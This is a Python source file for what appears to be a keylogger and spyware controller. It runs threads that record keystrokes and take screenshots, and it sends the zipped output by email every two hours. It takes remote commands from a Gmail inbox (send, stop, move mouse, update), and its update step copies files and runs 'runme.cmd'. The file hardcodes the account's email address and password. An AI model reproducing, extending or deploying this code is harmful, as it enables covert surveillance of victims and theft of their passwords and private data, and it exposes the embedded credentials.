from keylogThread import logger
from sendThread import sender
from screenThread import screenCapper
from mailThread import receiveThread
import shutil
import sys
import mouse
import zip
import datetime
import time
import sendMail
import os
import threading
outputDir = "output\\"
screenDir = "screenShots\\"
logDir = "logFiles\\"
from queue import Queue
	
email = "keylog460@gmail.com"
passwd = 'TheAllSpark'	
sendInter = 60*60*2
	
def sendOutput():
	print("send")
	
def setDirs():
	if not os.path.exists("output"):
		os.makedirs("output")
	if not os.path.exists("output\\logFiles"):
		os.makedirs("output\\logFiles")
	if not os.path.exists("output\\screenShots"):
		os.makedirs("output\\screenShots")
	if not os.path.exists("updates"):
		os.makedirs("updates")
		
	
def doSend(logTh, screenTh, sendTh, recTh):
	logTh.queue.put("pause")
	screenTh.queue.put("pause")
	recTh.inQueue.put("pause")
	while (not logTh.isPaused() or not screenTh.isPaused() or not recTh.isPaused()):
		time.sleep(.5)
	
	sendTh.inQueue.put("sendZip")
	
	while(True):
		val = ""
		if not sendTh.outQueue.empty():
			val = sendTh.outQueue.get()
		if val == "done":
			break
	
	logTh.queue.put("resume")
	screenTh.queue.put("resume")
	recTh.inQueue.put("resume")
	
	
def doUpdate():
	src_files = os.listdir("updates")
	for file_name in src_files:
		full_file_name = os.path.join("updates", file_name)
		if (os.path.isfile(full_file_name)):
			shutil.copy(full_file_name, file_name)
		os.remove(full_file_name)
	os.startfile('runme.cmd')
			
			
if __name__ == '__main__':
	currT = time.time()
	print("*****Program begins******")
	setDirs()
	logQ = Queue()
	screenQ = Queue()
	sendInQ = Queue()
	sendOutQ = Queue()
	recInQ = Queue()
	recOutQ = Queue()
	actionQ = Queue()
	
	

	
	logTh = logger(logQ, args=(True, outputDir + logDir))
	logTh.start()
	
	screenTh = screenCapper(screenQ, args=(True, outputDir + screenDir))
	screenTh.start()
	
	sendTh = sender(sendInQ, sendOutQ, args=(True, outputDir))
	sendTh.start()
	
	recTh = receiveThread(recInQ, recOutQ, args=(True, email, passwd))
	recTh.start()
	
	print("collecting data")
	lastSend = time.time()
	
	action = ""
	stop = False
	while(not stop or not recTh.outQueue.empty()):
		action = ""
		time.sleep(1)
		if(time.time() - lastSend > sendInter): # send every 2 hours
			lastSend = time.time()
			doSend(logTh, screenTh, sendTh, recTh)

		if not recTh.outQueue.empty():
			action = recTh.outQueue.get()
			print("recieved: " + action)
		
		if "send" in action:
			print("email send")
			doSend(logTh, screenTh, sendTh, recTh)	
		elif "stop" in action:
			print("force quit")
			stop = True
		elif "move" in action:
			a, xS, yS = action.split()
			x = int(xS)
			y = int(yS)
			mouse.moveMouse(x,y)
		elif "update" in action:
			sendTh.inQueue.put("quit")
			screenTh.queue.put("quit")
			logTh.queue.put("quit")
			recTh.inQueue.put("quit")
			doUpdate()
			break
		
	
	#zip
	#send
	#repeat
	#???
	#profit
	
	
	sendTh.inQueue.put("quit")
	screenTh.queue.put("quit")
	logTh.queue.put("quit")
	recTh.inQueue.put("quit")
	print("****main program quit****")
	
	